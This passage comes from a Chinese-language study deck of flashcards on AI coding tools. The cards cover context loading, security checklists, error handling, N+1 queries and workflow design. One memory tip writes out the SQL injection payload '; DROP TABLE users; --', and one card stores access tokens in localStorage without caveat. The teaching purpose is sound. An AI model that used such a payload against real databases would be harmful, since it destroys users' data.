- 演算法：RS256（非對稱加密）
- 有效期：Access Token 15 分鐘，Refresh Token 7 天
- 儲存：Access Token 存 localStorage，Refresh Token 存 httpOnly Cookie

**常見問題**：
Q: Token 過期如何處理？
A: 前端攔截 401，自動使用 Refresh Token 換取新 Access Token
```

**【記憶點】**
```
跨會話記憶 = 更新 CLAUDE.md + 記錄重要決策
```

---

### C07：上下文策略選擇

**【情境】**
你有 3 個專案：
- 專案 A：10 個微服務，每個 2,000 行
- 專案 B：單體應用，50,000 行
- 專案 C：熟悉的小專案，5,000 行

**問題**：為每個專案設計上下文策略。

---

**【解答】**

**專案 A：微服務架構（10 × 2,000 行）**
```bash
策略：分服務管理上下文

# 不要一次載入所有服務
# 根據當前工作的服務動態載入

# 工作在服務 A
claude --add-dir ./services/service-a/src

# 需要理解服務間通訊
claude --add-dir ./services/service-b/api

# 建立共享 CLAUDE.md
# services/SHARED.md（所有服務共用的規範）
# services/service-a/CLAUDE.md（服務 A 特定規範）
```

**專案 B：巨型單體（50,000 行）**
```bash
策略 1：初步理解用 Gemini CLI
gemini /code --add-dir ./src
> 分析專案架構，生成 onboarding 文檔

策略 2：開發用 Claude Code + 模組化載入
# 只載入當前模組
claude --add-dir ./src/auth
claude --add-dir ./src/api

# CLAUDE.md 只記錄核心資訊
# 不要包含所有細節（會超過上下文）
```

**專案 C：熟悉小專案（5,000 行）**
```bash
策略：全部載入 + 豐富的 CLAUDE.md

# 一次載入全部
claude --add-dir ./src
claude --add-dir ./tests

# CLAUDE.md 包含詳細資訊
# - 所有 API 契約
# - 所有常見問題
# - 所有程式碼模式
```

**【記憶點】**
```
微服務 → 分服務載入
巨型專案 → Gemini 初探 + Claude 開發（模組化載入）
小專案 → 全部載入
```

---

## ✅ D - 程式碼驗證（5 張）

### D01：安全性驗證清單

**【情境】**
你需要審查一段 API 端點程式碼的安全性。

**問題**：列出完整的安全性檢查清單。

---

**【解答】**

**安全性驗證清單**：

```markdown
□ 1. 注入攻擊防護
  □ SQL 注入：是否使用參數化查詢？
  □ NoSQL 注入：是否驗證查詢物件？
  □ 命令注入：是否過濾 shell 命令？
  □ LDAP 注入：是否轉義特殊字元？

□ 2. 身份驗證與授權
  □ 是否驗證使用者身份？
  □ 是否檢查使用者權限？
  □ Token 是否安全儲存？
  □ Session 是否有超時設定？

□ 3. 資料驗證
  □ 是否驗證輸入格式？
  □ 是否檢查資料範圍？
  □ 是否過濾特殊字元？
  □ 檔案上傳是否限制類型和大小？

□ 4. 敏感資料保護
  □ 密碼是否使用 bcrypt/Argon2？
  □ 敏感資料是否加密？
  □ 日誌是否包含敏感資料？
  □ 錯誤訊息是否洩露資訊？

□ 5. 跨站攻擊防護
  □ XSS：是否轉義使用者輸入？
  □ CSRF：是否使用 CSRF Token？
  □ Clickjacking：是否設定 X-Frame-Options？

□ 6. 速率限制與防暴力破解
  □ 是否有 API 速率限制？
  □ 登入是否有失敗次數限制？
  □ 是否有驗證碼保護？

□ 7. 安全標頭
  □ Content-Security-Policy
  □ X-Content-Type-Options
  □ Strict-Transport-Security
  □ X-Frame-Options

□ 8. 資源存取控制
  □ 路徑遍歷防護
  □ 檔案權限檢查
  □ 目錄列表禁用
```

**使用方式**：
```python
# 審查這段程式碼
@app.route('/api/user/<int:user_id>/profile', methods=['GET'])
def get_profile(user_id):
    # 對照清單逐項檢查
    # □ 1. 注入攻擊防護
    # □ 2. 身份驗證與授權
    # ...
```

**【記憶點】**
```
安全審查 = 8 大類別 × 多個檢查點 = 系統化檢查
```

---

### D02：錯誤處理評估

**【情境】**
```python
def process_payment(user_id, amount):
    user = get_user(user_id)
    user.balance -= amount
    save_user(user)
    return True
```

**問題**：這段程式碼的錯誤處理有什麼問題？

---

**【解答】**

**缺失的錯誤處理**：

```python
# 問題 1：使用者不存在
user = get_user(user_id)  # 如果不存在會回傳 None
user.balance -= amount    # AttributeError: 'NoneType' object has no attribute 'balance'

# 問題 2：餘額不足
user.balance -= amount  # 可能變成負數，沒有檢查

# 問題 3：資料庫錯誤
save_user(user)  # 如果資料庫連線失敗？

# 問題 4：並發問題
# 兩個請求同時扣款可能導致競態條件
```

**改進版本**：
```python
def process_payment(user_id: int, amount: Decimal) -> dict:
    """處理支付"""
    try:
        # 1. 驗證參數
        if amount <= 0:
            return {"success": False, "error": "Invalid amount"}

        # 2. 獲取使用者（處理不存在情況）
        user = get_user(user_id)
        if user is None:
            return {"success": False, "error": "User not found"}

        # 3. 檢查餘額
        if user.balance < amount:
            return {"success": False, "error": "Insufficient balance"}

        # 4. 使用資料庫事務（處理並發和資料庫錯誤）
        with db.transaction():
            user = db.execute(
                "SELECT * FROM users WHERE id = ? FOR UPDATE",
                (user_id,)
            ).fetchone()

            user.balance -= amount
            db.execute(
                "UPDATE users SET balance = ? WHERE id = ?",
                (user.balance, user_id)
            )

        return {"success": True, "new_balance": user.balance}

    except DatabaseError as e:
        logger.error(f"Database error in process_payment: {str(e)}")
        return {"success": False, "error": "Database error"}

    except Exception as e:
        logger.error(f"Unexpected error in process_payment: {str(e)}")
        return {"success": False, "error": "Internal server error"}
```

**錯誤處理檢查清單**：
```markdown
□ 參數驗證（類型、範圍、格式）
□ 資源存在性檢查（使用者、檔案等）
□ 業務邏輯驗證（餘額、權限等）
□ 資料庫錯誤處理
□ 網路錯誤處理
□ 並發問題處理
□ 記錄詳細錯誤日誌
□ 返回適當的錯誤訊息
```

**【記憶點】**
```
錯誤處理 = 參數驗證 + 資源檢查 + 業務邏輯 + 異常捕獲 + 日誌記錄
```

---

### D03：程式碼品質評分

**【情境】**
```python
def f(x,y):
    r=[]
    for i in x:
        if i>y:
            r.append(i*2)
    return r
```

**問題**：用 1-10 分評分，並說明如何改進。

---

**【解答】**

**評分：3/10**

**問題分析**：
```
1. 命名不清晰（-3 分）
   - f, x, y, r, i 都不知道含義

2. 沒有類型提示（-1 分）
   - 不知道輸入輸出類型

3. 沒有文檔字串（-1 分）
   - 不知道函數用途

4. 格式不規範（-1 分）
   - 缺少空格

5. 邏輯不夠清晰（-1 分）
   - 可以用列表推導式
```

**改進版本（10/10）**：
```python
def filter_and_double(numbers: list[int], threshold: int) -> list[int]:
    """
    過濾大於閾值的數字並加倍

    Args:
        numbers: 待處理的數字列表
        threshold: 過濾閾值

    Returns:
        大於閾值的數字加倍後的列表

    Examples:
        >>> filter_and_double([1, 2, 3, 4, 5], 3)
        [8, 10]
    """
    return [num * 2 for num in numbers if num > threshold]
```

**品質評分標準**：
```markdown
命名清晰度（3 分）：
  - 變數名自說明
  - 函數名描述功能
  - 避免縮寫

類型提示（1 分）：
  - 參數類型
  - 返回類型

文檔完整性（2 分）：
  - Docstring
  - 範例

程式碼簡潔性（2 分）：
  - 使用語言特性（列表推導式、生成器）
  - 避免冗餘程式碼

可讀性（2 分）：
  - 格式規範
  - 邏輯清晰
```

**【記憶點】**
```
程式碼品質 = 命名 + 類型 + 文檔 + 簡潔 + 可讀
```

---

### D04：效能問題識別

**【情境】**
```python
def get_user_orders(user_id):
    orders = []
    for order_id in get_all_order_ids():
        order = get_order(order_id)  # 資料庫查詢
        if order.user_id == user_id:
            orders.append(order)
    return orders
```

**問題**：這段程式碼有什麼效能問題？

---

**【解答】**

**效能問題：N+1 查詢問題**

**問題分析**：
```python
# 假設有 10,000 個訂單
order_ids = get_all_order_ids()  # 1 次查詢，返回 10,000 個 ID

for order_id in order_ids:       # 迴圈 10,000 次
    order = get_order(order_id)  # 每次 1 次資料庫查詢
    # ...

# 總查詢次數：1 + 10,000 = 10,001 次
# 如果每次查詢 10ms → 總時間 100 秒！
```

**改進方案**：

**方案 1：使用單一查詢（最佳）**
```python
def get_user_orders(user_id: int) -> list[Order]:
    """獲取使用者所有訂單"""
    # 單一查詢，資料庫過濾
    return db.execute(
        "SELECT * FROM orders WHERE user_id = ?",
        (user_id,)
    ).fetchall()
```

**方案 2：批量查詢（如果必須分步）**
```python
def get_user_orders(user_id: int) -> list[Order]:
    """獲取使用者所有訂單（批量查詢）"""
    # 先獲取該使用者的所有訂單 ID
    order_ids = db.execute(
        "SELECT id FROM orders WHERE user_id = ?",
        (user_id,)
    ).fetchall()

    # 批量獲取訂單詳情
    if not order_ids:
        return []

    placeholders = ','.join('?' * len(order_ids))
    orders = db.execute(
        f"SELECT * FROM orders WHERE id IN ({placeholders})",
        order_ids
    ).fetchall()

    return orders
```

**方案 3：使用 ORM 的 eager loading**
```python
# SQLAlchemy 範例
def get_user_orders(user_id: int) -> list[Order]:
    return Order.query.filter_by(user_id=user_id).options(
        joinedload(Order.items),  # 預載入關聯資料
        joinedload(Order.shipping)
    ).all()
```

**效能優化檢查清單**：
```markdown
□ N+1 查詢問題
  → 使用 JOIN 或 IN 查詢

□ 缺少索引
  → 為常查詢欄位添加索引

□ 載入不必要的資料
  → 只 SELECT 需要的欄位

□ 沒有分頁
  → 使用 LIMIT 和 OFFSET

□ 沒有快取
  → 對不變資料使用快取

□ 同步 I/O 阻塞
  → 使用非同步或多執行緒
```

**【記憶點】**
```
看到迴圈中的資料庫查詢 → 想到 N+1 問題 → 改用單一查詢或批量查詢
```

---

### D05：綜合驗證流程

**【情境】**
你需要審查一個完整的使用者註冊功能。

**問題**：設計完整的驗證流程。

---

**【解答】**

**驗證流程（5 個階段）**：

**階段 1：安全性驗證（30%）**
```markdown
□ SQL 注入檢查
  → 資料庫查詢是否用參數化？

□ XSS 檢查
  → 使用者輸入是否轉義？

□ 密碼安全性
  → 是否使用 bcrypt？
  → 是否有密碼強度要求？

□ 速率限制
  → 是否防暴力註冊？
```

**階段 2：錯誤處理驗證（20%）**
```markdown
□ 參數驗證
  → 缺少欄位如何處理？
  → 格式錯誤如何處理？

□ 資料庫錯誤
  → 連線失敗如何處理？
  → 唯一性衝突如何處理？

□ 日誌記錄
  → 錯誤是否記錄？
  → 日誌是否包含敏感資料？
```

**階段 3：程式碼品質驗證（20%）**
```markdown
□ 命名清晰度
□ 類型提示
□ 文檔字串
□ 程式碼簡潔性
```

**階段 4：業務邏輯驗證（20%）**
```markdown
□ 業務規則正確性
  → 註冊流程是否符合需求？
  → 驗證規則是否正確？

□ 資料完整性
  → 是否檢查重複註冊？
  → 關聯資料是否正確建立？
```

**階段 5：效能驗證（10%）**
```markdown
□ 資料庫查詢效率
□ 是否有 N+1 問題
□ 是否需要快取
```

**完整範例（審查報告）**：
```markdown
## 使用者註冊功能審查報告

### 安全性（7/10）
✓ 使用參數化查詢
✓ 密碼使用 bcrypt
✗ 缺少速率限制
✗ 缺少 CSRF 保護

### 錯誤處理（6/10）
✓ 有參數驗證
✓ 有資料庫錯誤處理
✗ 錯誤訊息過於詳細（資訊洩露）
✗ 日誌包含使用者密碼（安全問題！）

### 程式碼品質（9/10）
✓ 命名清晰
✓ 有類型提示
✓ 有文檔字串
✓ 程式碼簡潔

### 業務邏輯（8/10）
✓ 註冊流程正確
✓ 驗證規則完整
✗ 缺少電子郵件驗證

### 效能（7/10）
✓ 查詢效率高
✓ 有索引
✗ 可以添加註冊成功快取

### 總分：37/50（74%）

### 必須修復（優先級 P0）：
1. 移除日誌中的密碼
2. 添加速率限制
3. 修復資訊洩露問題

### 建議改進（優先級 P1）：
1. 添加 CSRF 保護
2. 添加電子郵件驗證

### 可選優化（優先級 P2）：
1. 添加註冊成功快取
```

**【記憶點】**
```
綜合驗證 = 安全性(30%) + 錯誤處理(20%) + 程式碼品質(20%) + 業務邏輯(20%) + 效能(10%)
```

---

## 🎯 E - 綜合應用（4 張）

### E01：決策流程樹

**【情境】**
新專案開始前，需要做一系列決策。

**問題**：設計完整的決策流程。

---

**【解答】**

**AI 工具選擇決策樹**：
```
START: 新專案開始

Q1: 專案規模？
  ├─ 小型（< 5,000 行）
  │   Q2: 需要架構控制？
  │     ├─ 是 → Claude Code（建立完整 CLAUDE.md）
  │     └─ 否 → GitHub Copilot（快速開發）
  │
  ├─ 中型（5,000 - 20,000 行）
  │   Q3: 有複雜重構需求？
  │     ├─ 是 → Claude Code（工作流程編排）
  │     └─ 否 → Copilot + Claude Code 混合
  │
  └─ 大型（> 20,000 行）
      Q4: 第一次接觸？
        ├─ 是 → Gemini CLI（快速理解）+ Claude Code（開發）
        └─ 否 → Claude Code（持續開發）

Q5: 是否需要知識工作（非程式碼）？
  ├─ 是 → Claude Code + MCP
  └─ 否 → 根據上述決策

Q6: 預算？
  ├─ 緊張 → 優先 Copilot（$10/月）
  ├─ 充足 → 混合使用（Copilot + Claude Code）
  └─ 企業級 → 全員配置 + 建立標準

Q7: 團隊經驗？
  ├─ 初級 → Copilot（學習曲線低）
  ├─ 中級 → 混合使用
  └─ 資深 → Claude Code（最大化控制）
```

**【記憶點】**
```
決策順序：規模 → 複雜度 → 預算 → 團隊經驗
```

---

### E02：問題診斷流程

**【情境】**
AI 生成的程式碼品質不佳，需要診斷原因。

**問題**：設計診斷流程。

---

**【解答】**

**診斷流程（4 個步驟）**：

**步驟 1：檢查上下文**
```bash
claude /context

問題檢查：
□ 上下文使用率是否過高（> 90%）？
  → 是：壓縮上下文（/compact）

□ 是否載入了正確的檔案？
  → 否：調整 --add-dir

□ CLAUDE.md 是否存在且完整？
  → 否：建立或更新 CLAUDE.md
```

**步驟 2：檢查專案記憶**
```bash
claude /memory

問題檢查：
□ CLAUDE.md 是否包含核心規範？
  - 技術棧
  - 架構原則
  - 編碼規範
  - 常見問題

□ 是否有過時或錯誤的資訊？
  → 是：更新或移除

□ 是否記錄了最近的架構決策？
  → 否：補充記錄
```

**步驟 3：檢查提示詞品質**
```markdown
問題檢查：
□ 提示詞是否清晰具體？
  ❌ "寫一個使用者認證"
  ✓ "實作使用者認證功能，使用 JWT，符合專案規範"

□ 是否提供了足夠的上下文？
  ❌ "修復這個 bug"
  ✓ "修復 auth.py 第 45 行的 SQL 注入漏洞，使用參數化查詢"

□ 是否說明了約束條件？
  ❌ "生成測試"
  ✓ "生成單元測試，使用 pytest，覆蓋率 ≥ 80%"
```

**步驟 4：驗證 AI 輸出**
```markdown
問題檢查：
□ 是否使用驗證清單檢查？
□ 是否測試了程式碼？
□ 是否進行了安全審查？

改進措施：
→ 使用 /agents:code-reviewer 審查
→ 使用 /agents:security-auditor 掃描
→ 執行測試套件驗證
```

**診斷決策樹**：
```
問題：AI 生成的程式碼不符合規範

檢查 1：CLAUDE.md 是否存在？
  └─ 否 → 建立 CLAUDE.md → 重新生成

檢查 2：CLAUDE.md 是否包含相關規範？
  └─ 否 → 補充規範 → 重新生成

檢查 3：提示詞是否清晰？
  └─ 否 → 優化提示詞 → 重新生成

檢查 4：上下文是否正確？
  └─ 否 → 調整上下文 → 重新生成

檢查 5：模型是否合適？
  └─ 否 → 切換模型 → 重新生成
```

**【記憶點】**
```
診斷順序：上下文 → 記憶 → 提示詞 → 驗證
```

---

### E03：工作流程設計

**【情境】**
設計一個完整的 AI 輔助開發工作流程。

**問題**：從需求到上線的完整流程。

---

**【解答】**

**完整工作流程（7 個階段）**：

**階段 1：需求分析（Explore）**
```bash
# 工具：Claude Code
claude --add-dir ./src

提示詞：
> 分析這個功能需求：[需求描述]
> 找出：
> 1. 涉及的模組
> 2. 需要修改的檔案
> 3. 潛在的技術挑戰
> 4. 依賴關係
```

**階段 2：架構設計（Plan）**
```bash
提示詞：
> 基於分析結果，設計實作方案：
> 1. 資料模型設計
> 2. API 介面設計
> 3. 模組結構
> 4. 測試策略
> 5. 潛在風險

# 審核方案
> 評估方案的可行性和風險
```

**階段 3：實作開發（Code）**
```bash
# 使用 Copilot 快速開發
# 在 IDE 中開啟相關檔案，使用 Copilot 補全

# 複雜部分使用 Claude Code
claude
> 實作核心功能，遵循專案規範
> 分階段進行，每階段完成後暫停
```

**階段 4：程式碼審查（Review）**
```bash
# 切換到審查 agent
claude /agents:code-reviewer
> 審查剛才實作的程式碼，檢查：
> 1. 程式碼品質
> 2. 是否符合規範
> 3. 潛在的 bug
> 4. 可維護性

# 安全審查
claude /agents:security-auditor
> 進行安全掃描
```

**階段 5：測試驗證（Verify）**
```bash
# 生成測試
claude /agents:test-generator
> 為新功能生成完整的測試套件：
> 1. 單元測試
> 2. 整合測試
> 3. 邊界情況測試

# 執行測試
pytest tests/
```

**階段 6：文檔更新（Document）**
```bash
# 更新專案記憶
claude /memory
# 記錄：
# - 架構決策
# - 新的 API 契約
# - 常見問題

# 生成使用者文檔
claude /agents:documentation-writer
> 為新功能生成文檔
```

**階段 7：部署上線（Deploy）**
```bash
# CI/CD 自動化（已配置 GitHub Actions）
git add .
git commit -m "feat: implement new feature"
git push origin feature/new-feature

# Claude Code 自動審查 PR
# 通過後合併到 main
# 自動部署到生產環境
```

**流程圖**：
```
需求分析 (Explore) → 架構設計 (Plan) → 實作開發 (Code)
                                              ↓
部署上線 (Deploy) ← 文檔更新 (Document) ← 測試驗證 (Verify) ← 程式碼審查 (Review)
```

**【記憶點】**
```
EPCV 流程：Explore → Plan → Code → Verify + Review + Document → Deploy
```

---

### E04：持續改進循環

**【情境】**
團隊使用 AI 工具 3 個月後，需要評估和改進。

**問題**：設計持續改進機制。

---

**【解答】**

**持續改進循環（4 個階段）**：

**階段 1：資料收集（每週）**
```markdown
收集指標：
□ 首次正確率
  → 記錄 AI 生成程式碼首次通過審查的比例

□ 迭代次數
  → 記錄每個任務平均需要多少次迭代

□ 時間節省
  → 對比使用 AI 前後的開發時間

□ 問題類型
  → 記錄 AI 常犯的錯誤類型

□ 工具使用情況
  → 記錄每個工具的使用頻率
```

**階段 2：分析評估（每月）**
```markdown
分析方法：
1. 首次正確率分析
   < 50%：CLAUDE.md 需要改進
   50-70%：提示詞需要優化
   > 70%：良好

2. 錯誤模式分析
   高頻錯誤 → 更新 CLAUDE.md
   特定場景問題 → 建立情境記憶卡

3. 工具使用分析
   使用率低 → 培訓不足或工具不適合
   使用率高但效果差 → 使用方式有問題
```

**階段 3：改進實施（每月）**
```markdown
改進措施：
□ 更新 CLAUDE.md
  → 補充常見問題
  → 優化規範描述
  → 添加更多範例

□ 建立團隊知識庫
  → 收集常見場景
  → 建立提示詞模板
  → 記錄最佳實踐

□ 優化工作流程
  → 調整工具組合
  → 改進審查流程
  → 自動化重複任務

□ 團隊培訓
  → 分享成功案例
  → 演示進階技巧
  → 解答常見問題
```

**階段 4：效果驗證（下個週期）**
```markdown
驗證指標：
□ 首次正確率是否提升？
□ 開發時間是否縮短？
□ 程式碼品質是否改善？
□ 團隊滿意度是否提高？
```

**改進循環圖**：
```
資料收集 → 分析評估 → 改進實施 → 效果驗證
    ↑                                    ↓
    └────────────────────────────────────┘
             持續循環
```

**範例：改進報告**
```markdown
## AI 工具使用月度報告（2025-01）

### 關鍵指標
- 首次正確率：68% → 78%（↑ 10%）
- 平均迭代次數：3.2 → 2.5（↓ 22%）
- 開發時間節省：35%
- 團隊滿意度：8.2/10

### 主要問題
1. SQL 注入檢查常被遺漏（15%）
2. 錯誤處理不完整（20%）
3. 測試覆蓋率不足（25%）

### 已實施改進
1. 更新 CLAUDE.md，強調安全規範
2. 建立驗證清單模板
3. 添加自動化測試生成流程

### 下月目標
- 首次正確率 → 85%
- 安全問題 → < 5%
- 測試覆蓋率 → 100%
```

**【記憶點】**
```
持續改進 = 收集資料 → 分析問題 → 實施改進 → 驗證效果（循環）
```

---

## 📊 學習追蹤

### 記憶卡複習進度

| 分類 | 卡片數 | 已掌握 | 需複習 | 完成度 |
|------|-------|--------|--------|--------|
| A - 安全漏洞識別 | 8 | __ | __ | __% |
| B - 工具選擇決策 | 6 | __ | __ | __% |
| C - 上下文工程 | 7 | __ | __ | __% |
| D - 程式碼驗證 | 5 | __ | __ | __% |
| E - 綜合應用 | 4 | __ | __ | __% |
| **總計** | **30** | __ | __ | __% |

### 複習時間表

```
第 1 天：學習新卡片（10 張）
第 2 天：複習 Day 1（10 張）+ 學習新卡片（10 張）
第 3 天：複習 Day 1-2（20 張）+ 學習新卡片（10 張）
第 4 天：複習 Day 2-3（20 張）
第 7 天：複習 Day 1-3（30 張）
第 14 天：複習所有卡片（30 張）
第 30 天：複習所有卡片（30 張）
```

---

## 💡 學習建議

### 高效使用記憶卡

**不要**：
- ❌ 只看不想就翻答案
- ❌ 看到熟悉就按 Easy
- ❌ 一次性學習太多張（> 15 張）
- ❌ 連續幾天不複習

**應該**：
- ✅ 每次完整思考再翻答案
- ✅ 誠實評分（Hard/Good/Easy）
- ✅ 每天固定時間複習
- ✅ 建立個人情境題庫
- ✅ 實際應用所學知識

### 記憶強化技巧

**1. 視覺化記憶**：
```
看到程式碼 → 在腦中視覺化攻擊場景
例如：SQL 注入 → 想像 '; DROP TABLE users; --
```

**2. 連結記憶**：
```
新知識 → 連結到已知知識
例如：bcrypt → 類比加鹽醃製（Salt）
```

**3. 實踐記憶**：
```
學到新概念 → 立即在專案中應用
例如：學會驗證清單 → 立即審查一段程式碼
```

---

## 🎓 完成標準

### 基礎能力（必須）

- [ ] 完成所有 A 類卡片（安全漏洞識別）
- [ ] 能快速識別 SQL 注入、XSS、路徑遍歷
- [ ] 理解工具選擇的基本原則
- [ ] 能建立基本的 CLAUDE.md

### 進階能力（推薦）

- [ ] 完成所有 A-D 類卡片
- [ ] 能設計完整的驗證清單
- [ ] 能為不同場景選擇最優工具
- [ ] 能設計上下文管理策略

### 專家能力（卓越）

- [ ] 完成所有 30 張記憶卡
- [ ] 能設計企業級工作流程
- [ ] 能進行綜合問題診斷
- [ ] 能建立持續改進機制

---

**記憶卡庫版本**：v1.0
**最後更新**：2025-01-30
**適用模組**：模組 1 - AI 編程基礎認知
**總卡片數**：30 張

**祝學習順利！記住：不是背誦定義，而是建立情境 → 行動的神經連結。**
